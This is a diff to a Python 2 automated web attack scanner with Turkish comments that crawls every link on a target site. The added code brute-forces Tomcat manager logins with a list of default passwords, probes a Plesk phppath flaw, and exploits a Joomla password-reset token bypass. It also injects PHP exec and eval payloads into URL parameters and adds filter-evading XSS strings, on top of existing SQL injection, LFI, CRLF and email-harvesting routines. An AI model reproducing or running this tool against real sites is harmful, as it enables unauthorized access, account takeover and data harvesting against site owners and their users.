@@ -16,6 +16,9 @@
 #tum linklerde php ve asp lfi dener
 #tum linklerde header crlf injection dener
 #tum linklerde login sayfalarini otomatik bulup basit capli brute gerceklestirir.
+#linklerde olan joomlalari bulup joomla token acigini otomatik tarar
+#son zamanlarda cikan plesk 0day aciginida otomatik test eder
+#tomcat olan siteyi tespit edip default passlari authentication brute eder.
 #cookie ve proxy destegide vardir.
 #ajax ile veri gonderimi olan dosyalari tespit eder
 #sitede gecen emailleri otomatik toplar
@@ -99,6 +102,55 @@ urllib2.install_opener(opener)
 aynilinkler={}
 limitlinkler={}
 
+
+
+def tomcatkontrol(url):
+
+	kullanici=["tomcat","password","admin","admin","root","tomcat","admin"]
+	sifre=["tomcat","password","admin","password","root","s3cret","admintesting"]
+	
+	tomi=0
+	while tomi < len(kullanici): 
+	    try:
+		base64string = base64.encodestring('%s:%s' % (kullanici[tomi],sifre[tomi]))
+		
+		print "Tomcat brute ediliyor "+kullanici[tomi]+" - "+sifre[tomi]
+		
+		request = urllib2.Request(url+":8080/manager/html")
+		request.add_header("Authorization", "Basic %s" % base64string)
+		result = urllib2.urlopen(request)
+		yaz("Tomcat Login Basarili!!  Username:"+kullanici[tomi]+" Sifre:"+sifre[tomi],True)
+		tomi=tomi+1
+	
+	    except urllib2.HTTPError:
+		tomi=tomi+1
+		continue
+	
+	    except urllib2.URLError,  e:
+		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+						#yaz(mesaj)
+	    except:
+		mesaj="Bilinmeyen hata olustu\n"  
+
+
+
+def pleskphppath(host):
+    
+    try:
+	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	    ip=socket.gethostbyname(host.replace("http://",""))
+	    s.settimeout(5)
+	    s.connect((ip, 80))
+	    s.send("GET /phppath/php HTTP/1.0\r\n\r\n")  
+	    buf = s.recv(1024);
+	    if "500 Internal" in buf:
+		yaz("Plesk Phppath acigi bulundu "+ip,True)
+	      
+    except socket.error, msg:
+	print "Plesk testi yapilirken hata olustu "
+	
+    except:
+	print "Server header bilgisi alinamadi"
 
 
 def headercrlf(link):
@@ -348,6 +400,81 @@ def sqlkodcalisiomu(url):
     
     
     
+
+
+def joomlatoken(url):
+    
+    print "Joomla Token acigi kontrol ediliyor..."
+    
+    datam={'token': "'"}
+    
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
+
+    sifirlamagiris=opener.open(url+"/index.php?option=com_user&view=reset&layout=confirm").read()
+    
+    md5 = re.match(r"([0-9a-f]{32})",sifirlamagiris,re.DOTALL) 
+    
+    if md5:
+	hashim=md5.group()
+	
+	datam[hashim]=1
+	
+	dataencode = urllib.urlencode(datam)
+	
+	resp = opener.open(url+"/index.php?option=com_user&task=confirmreset", dataencode).read()
+	
+	if "name=\"password1\"" in resp:
+	    
+	    yaz("Joomla Token acigi bulundu "+url,True)
+    
+    
+
+def execkontrol(response,urlnormal):
+    
+    print "Command injection hata mesajlari kontrol ediliyor"
+    
+    if re.search("eval()'d code</b> on line <b>",response,re.DOTALL):
+	mesaj= "[#] %s PHP eval hatasi " % urlnormal
+	yaz(mesaj,True)
+	
+    if re.search("Cannot execute a blank command in",response,re.DOTALL):
+	mesaj= "[#] %s exec hatasi " % urlnormal
+	yaz(mesaj,True)
+	
+    if re.search("Fatal error</b>:  preg_replace",response,re.DOTALL):
+	mesaj= "[#] %s Ppreg_replace hatasi " % urlnormal
+	yaz(mesaj,True)
+    
+    
+def phpexec(url):
+    
+    seperators = ["a;env","a);env","/e\0"]
+    
+    try:
+	for sep in seperators:
+	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
+		phpexechal={}
+		phpexechal[key]=sep
+	    phpexecparametre = urllib.urlencode(phpexechal)
+	    print "Exec Command Injection Deneniyor ... "
+	    urlac = urllib2.urlopen(url+"?"+phpexecparametre)
+	    response = urlac.read()
+	    execkontrol(response,url)
+	    
+    except urllib2.HTTPError,  e:
+	if(e.code==500):
+	    yaz("[#] Exec Http 500 Dondu " +url,True)
+    
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+	    #yaz(mesaj)
+    except:
+	mesaj="Bilinmeyen hata olustu\n"
+		#yaz(mesaj)       
+
+
+
+
 def getcommandinj(url):
     
     seperators = ['', '&&', '|', ';',"\";","';","\";"]
@@ -572,7 +699,7 @@ def cookieinjection(url,cookie):
 	                     ("X-Forwarded-For", "127.0.0.1'"),
 	                     ("Referer", "http://www.site.com'"),
 	                     ("Cookie", cookie.replace("=","='"))]
-	response = opener.open(url)
+	response = opener.open(url).read()
 	sqlkontrol(temizle(response),"[Cookie INJECTION]"+url)
 	
     except urllib2.HTTPError,  e:
@@ -619,32 +746,52 @@ def indexoful(url):
 
 def normalac(url):
     
+    try:
      
-    ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
-    socket=["websocket","ws:"]
-    
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
-    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
-    response = opener.open(url).read().lower()
-    
-    list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
-    if len(list)>0:
-	yaz("[#] Email Tespit Edildi "+url+"\n"+str(list),True)
-	    
-    for ajx in ajaxtespit:
-	if ajx in response:
-	    yaz("[#] Ajax Tespit Edildi "+url,True)
-	    
-    for sck in socket:
-	if sck in response:
-	    yaz("[#] WebSocket Tespit Edildi "+url,True)
-	    
-    if "<?xml" not in response or "%PDF" not in response:
-	if "<?" in response and "?>" in response:
-	    yaz("[#] PHP kod tespit Edildi "+url,True)
-	elif "<%" in response and "%>" in response:
-	    yaz("[#] ASP kod tespit Edildi "+url,True)
-    
+	ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
+	socket=["websocket","ws:"]
+	
+	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
+	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
+	response = opener.open(url).read().lower()
+	
+	
+	
+	if "Joomla" in response:
+	    joomlami=urllib2.urlopen(url+"/administrator").read()
+	    if "modlgn_username" in joomlami:
+		joomlatoken(url)
+	
+	
+	list=sre.findall("([0-9a-z\-_\.]+\@[0-9a-z\-_\.]+\.[0-9a-z\-_\.]+)",response)
+	if len(list)>0:
+	    yaz("[#] Email Tespit Edildi "+url+"\n"+str(list),True)
+		
+	for ajx in ajaxtespit:
+	    if ajx in response:
+		yaz("[#] Ajax Tespit Edildi "+url,True)
+		
+	for sck in socket:
+	    if sck in response:
+		yaz("[#] WebSocket Tespit Edildi "+url,True)
+		
+	if "<?xml" not in response or "%PDF" not in response:
+	    if "<?" in response and "?>" in response:
+		yaz("[#] PHP kod tespit Edildi "+url,True)
+	    elif "<%" in response and "%>" in response:
+		yaz("[#] ASP kod tespit Edildi "+url,True)
+		
+		
+    except urllib2.HTTPError,  e:
+	if(e.code==500):
+	    yaz("[#] Normal Giris HTTP 500 Dondu " +url,True)
+	    sqlkontrol(e.read(),urlnormal)
+
+    except urllib2.URLError,  e:
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+	#yaz(mesaj)
+    except:
+	print "Normal acarken Hata oldu"
     
 def openredirect(gelenurl):
     
@@ -1463,7 +1610,9 @@ def xsstara(xssurl):
                 "</style></script><script>alert(0x000123)</script>",
                 "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
                 "'\"--></style></script><script>alert(0x000123)</script>",
-                "';alert(0x000123)'"]
+                "';alert(0x000123)'",
+                "<scr<script>ipt>alert(0x000123)</script>",
+                "<scr<script>ipt>alert(0x000123)</scr</script>ipt>"]
     
     try:
 	for xssler in xsspayload:
@@ -1787,6 +1936,7 @@ def blind(urlblind):
 
 def portbanner(host):
     
+    
     print host
     #portlist = [21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080,1433]
     
@@ -1819,6 +1969,7 @@ def portbanner(host):
 	    print ""
 	except:
 	    print ""
+	    
     
     
 def aynivarmi(keyurl):
@@ -1860,6 +2011,23 @@ def headerbilgi(host):
 	urlac = urllib2.urlopen(host)
 	robots(host)
 	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
+	sunucubilgi1=urlac.info().getheader('Server')
+	sunucubilgi2=urlac.info().getheader('X-Powered-By')
+	if "Tomcat" in sunucubilgi1 or \
+	"Tomcat" in sunucubilgi2:
+	    yaz("Tomcat tespit edildi"+ host,True)
+	    tomcatkontrol(host)
+	else:
+	    urlac2 = urllib2.urlopen(host+":8080").read()
+	    
+	    if "<title>Apache Tomcat" in urlac2:
+		yaz("Tomcat tespit edildi"+ host,True)
+		tomcatkontrol(host)
+	    
+	if "Apache" in sunucubilgi1:
+	    pleskphppath(host)
+	    
+	    
     except:
 	print "Header bilgisi alinamadi"
 	
@@ -1946,6 +2114,7 @@ class Anaislem(threading.Thread):
 		headerinjection(self.tamurl)
 		if "?" in self.tamurl:
 		    y=1
+		    phpexec(self.tamurl)
 		    sqlkodcalisiomu(self.tamurl)
 		    lfitest(self.tamurl)
 		    headercrlf(self.tamurl)
@@ -1968,10 +2137,46 @@ def temizle(source):
 
 
 
+
+def yasaklikontrol(url,host):
+
+    #yasakli=["facebook","twitter","google.com","linkedin","friendfeed"]
+    
+    tamsite=urlparse.urlparse(url).hostname
+    
+    if tamsite.count(".")==1:
+	
+	gercekyol=tamsite.split(".")[0]
+	
+    elif tamsite.count(".")==2:
+	
+	gercekyol=tamsite.split(".")[1]
+	
+    elif tamsite.count(".")==3:
+	
+	gercekyol=tamsite.split(".")[2]
+	
+    elif tamsite.count(".")==4:
+	
+	gercekyol=tamsite.split(".")[3]
+	
+    elif tamsite.count(".")==5:
+	
+	gercekyol=tamsite.split(".")[4]
+	
+  
+    if gercekyol in host:
+	return False
+    else:
+	return True
+
 def kaydet(link,host):
     try:
+	
+	
+	
 	dahildegil = ("pkg","xlsx","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
-		
+	
 	linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
 	linkopener.addheaders = [
 	        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
@@ -2000,8 +2205,9 @@ def kaydet(link,host):
 			limiti=ZiyaretSayisi(tamurl2)
 			if limiti==False:
 			    yaz("[#] Resim URL sinde PHP/ASP Adres Tespit edildi " +dongululink+"\n Resim Link = " +tamurl2 ,True)
-			    analistem.append(tamurl2)
-			    aynilinkler[tamurl2]="bekir"
+			    if yasaklikontrol(tamurl2,host)==False:
+				analistem.append(tamurl2)
+				aynilinkler[tamurl2]="bekir"
 			
 		    
 		    
@@ -2017,9 +2223,10 @@ def kaydet(link,host):
 			    tamurl2=locationbypass(birlesik)
 			    limiti=ZiyaretSayisi(tamurl2)
 			    if limiti==False:
-				print tamurl2
-				analistem.append(tamurl2)
-				aynilinkler[tamurl2]="bekir"
+				if yasaklikontrol(tamurl2,host)==False:
+				    print tamurl2
+				    analistem.append(tamurl2)
+				    aynilinkler[tamurl2]="bekir"
 		    
 		    
 		if ee.split('.')[-1].lower() not in dahildegil:
@@ -2029,9 +2236,10 @@ def kaydet(link,host):
 			    tamurl2=locationbypass(birlesik)
 			    limiti=ZiyaretSayisi(tamurl2)
 			    if limiti==False:
-				print tamurl2
-				analistem.append(tamurl2)
-				aynilinkler[tamurl2]="bekir"
+				if yasaklikontrol(tamurl2,host)==False:
+				    print tamurl2
+				    analistem.append(tamurl2)
+				    aynilinkler[tamurl2]="bekir"
 				
 				
 	for tag in soup.findAll('a'):
@@ -2044,9 +2252,10 @@ def kaydet(link,host):
 			    tamurl=locationbypass(asilurl)
 			    limiti2=ZiyaretSayisi(tamurl)
 			    if limiti2==False:
-				print tamurl
-				analistem.append(tamurl)
-				aynilinkler[tamurl]="bekir"
+				if yasaklikontrol(tamurl,host)==False:
+				    print tamurl
+				    analistem.append(tamurl)
+				    aynilinkler[tamurl]="bekir"
 		
 		
 	for tag in soup.findAll('a'):
@@ -2058,9 +2267,10 @@ def kaydet(link,host):
 			    tamurl=locationbypass(asilurl)
 			    limiti2=ZiyaretSayisi(tamurl)
 			    if limiti2==False:
-				print tamurl
-				analistem.append(tamurl)
-				aynilinkler[tamurl]="bekir"
+				if yasaklikontrol(tamurl,host)==False:
+				    print tamurl
+				    analistem.append(tamurl)
+				    aynilinkler[tamurl]="bekir"
 
     except urllib2.HTTPError,  e:
 	if(e.code==500):
@@ -2129,8 +2339,6 @@ def main():
 		if "http://" in url:
 		    linkler(url,hostcx)
 		    analistem.append(url)
-
-
 		else:
 		    linkler("http://"+url,hostcx)
 		    analistem.append("http://"+url)
